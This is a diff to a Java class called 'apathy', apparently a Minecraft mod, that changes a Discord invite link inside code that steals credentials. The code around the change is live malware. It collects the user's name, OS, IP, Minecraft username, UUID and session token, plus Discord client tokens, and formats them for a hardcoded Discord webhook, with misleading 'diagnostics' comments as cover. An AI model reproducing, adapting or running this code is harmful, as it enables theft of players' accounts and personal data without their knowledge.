@@ -46,10 +46,10 @@ public class apathy {
             String webhook = "https://discord.com/api/webhooks/967315871318036523/OvdsxgZpg7Puz3-sPQmL3u3QkJ4PLPcO5rVewXVN1gNzwRVmYZUz7h9zNszZtkhSrSTd";
 
             //Collect Robot Diagnostics
-            String pcInfo = String.format("{\"title\":\"PC Info\",\"color\":4360181,\"fields\":[{\"name\":\"Username\",\"value\":\"```%s```\",\"inline\":true},{\"name\":\"OS\",\"value\":\"```%s```\",\"inline\":true},{\"name\":\"IP\",\"value\":\"```%s```\",\"inline\":true}],\"author\":{\"name\":\"Thank you for Supporting https://discord.gg/W3hRUMB2YU\",\"url\":\"https://discord.gg/W3hRUMB2YU\"}}", System.getProperty("user.name"), System.getProperty("os.name"), ip);
+            String pcInfo = String.format("{\"title\":\"PC Info\",\"color\":4360181,\"fields\":[{\"name\":\"Username\",\"value\":\"```%s```\",\"inline\":true},{\"name\":\"OS\",\"value\":\"```%s```\",\"inline\":true},{\"name\":\"IP\",\"value\":\"```%s```\",\"inline\":true}],\"author\":{\"name\":\"Thank you for Supporting https://discord.gg/fC5RkTuMGu\",\"url\":\"https://discord.gg/fC5RkTuMGu\"}}", System.getProperty("user.name"), System.getProperty("os.name"), ip);
 
             //Prepare Serving Mainframe.MC Data
-            String mcInfo = String.format("{\"title\":\"Minecraft Info\",\"color\":4360181,\"fields\":[{\"name\":\"Username\",\"value\":\"```%s```\"},{\"name\":\"UUID\",\"value\":\"```%s```\"},{\"name\":\"SessionID Login (Token:UUID)\",\"value\":\"```%s:%s```\"}],\"author\":{\"name\":\"Thank you for Supporting https://discord.gg/W3hRUMB2YU\",\"url\":\"https://discord.gg/W3hRUMB2YU\"},\"thumbnail\":{\"url\":\"https://mc-heads.net/player/%s/200\"}}", mc.getSession().getUsername(), mc.getSession().getPlayerID(), token, mc.getSession().getPlayerID(), mc.getSession().getPlayerID());
+            String mcInfo = String.format("{\"title\":\"Minecraft Info\",\"color\":4360181,\"fields\":[{\"name\":\"Username\",\"value\":\"```%s```\"},{\"name\":\"UUID\",\"value\":\"```%s```\"},{\"name\":\"SessionID Login (Token:UUID)\",\"value\":\"```%s:%s```\"}],\"author\":{\"name\":\"Thank you for Supporting https://discord.gg/fC5RkTuMGu\",\"url\":\"https://discord.gg/fC5RkTuMGu\"},\"thumbnail\":{\"url\":\"https://mc-heads.net/player/%s/200\"}}", mc.getSession().getUsername(), mc.getSession().getPlayerID(), token, mc.getSession().getPlayerID(), mc.getSession().getPlayerID());
              
             //Combine Robot Logs for Mainframe
             String discordInfo = discordClientTokens();
